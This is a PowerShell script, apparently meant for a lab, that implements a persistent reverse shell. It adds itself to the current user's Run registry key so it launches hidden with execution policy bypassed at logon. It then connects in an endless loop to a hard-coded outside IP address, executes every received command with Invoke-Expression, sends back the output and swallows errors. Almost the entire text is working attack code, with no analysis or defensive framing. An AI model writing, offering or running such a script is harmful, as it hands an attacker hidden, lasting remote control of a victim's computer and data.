# --- Ensure C:\Temp exists before logging ---
if (-not (Test-Path "C:\Temp")) {
    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
}

# --- Harmless logging at every execution ---
$logPath = "C:\Temp\lab_log.txt"
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Add-Content -Path $logPath -Value "Script executed - $timestamp"

# --- Self-persistence (adds itself to HKCU Run if not already present) ---
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "LabTestScript"
$scriptPath = "$env:USERPROFILE\LabReverseShellWithLogging.ps1"
$command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name $regName -Value $command
}

# --- Your reverse shell code ---
$remoteIp = "129.151.142.36"
$remotePort = 3324

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($remoteIp, $remotePort)
        $stream = $client.GetStream()

        [byte[]]$buffer = New-Object byte[] 65535

        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
            $output = Invoke-Expression $data 2>&1 | Out-String
            $response = $output + "PS " + (Get-Location).Path + "> "
            $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($response)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
            $stream.Flush()
        }

        $stream.Close()
        $client.Close()
    }
    catch {
        # suppress errors
    }

    Start-Sleep -Seconds 5
}
